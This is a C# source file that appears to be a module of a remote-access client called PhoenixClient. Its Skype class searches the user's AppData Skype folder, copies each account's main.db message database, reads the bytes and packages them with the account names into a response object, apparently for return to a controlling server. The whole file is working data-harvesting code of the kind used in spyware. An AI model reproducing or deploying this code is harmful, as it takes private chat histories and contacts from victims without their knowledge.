using PhoenixLib.Datastore.CommunicationClasses;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace PhoenixClient.Work.ClientOperations
{
    public static class Skype
    {
        private static String[] ignore = { "Content", "DataRv", "My Skype Received Files", "shared_dynco", "shared_httpfe" };
        public static SkypeResponse getAccountData()
        {
            List<SkypeAccountEntry> accounts = new List<SkypeAccountEntry>();
            String path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Skype");
            if (!Directory.Exists(path))
                return null;
            String[] directories = Directory.GetDirectories(path);
            foreach (String dir in directories)
            {
                String partial = dir.Substring(dir.LastIndexOf("\\") + 1);
                if (!ignore.Contains(partial))
                {
                    String[] files = Directory.GetFiles(dir);
                    foreach (String file in files)
                    {
                        String last = file.Substring(file.LastIndexOf("\\") + 1);
                        if (last.Equals("main.db"))
                        {
                            File.Copy(file, "temp.db");
                            byte[] data = File.ReadAllBytes("temp.db");
                            File.Delete("temp.db");
                            accounts.Add(new SkypeAccountEntry
                            {
                                skypeAccount = partial,
                                db = data
                            });
                            break;
                        }
                    }
                }
            }
            return new SkypeResponse
            {
                entries = accounts
            };
        }
    }
}
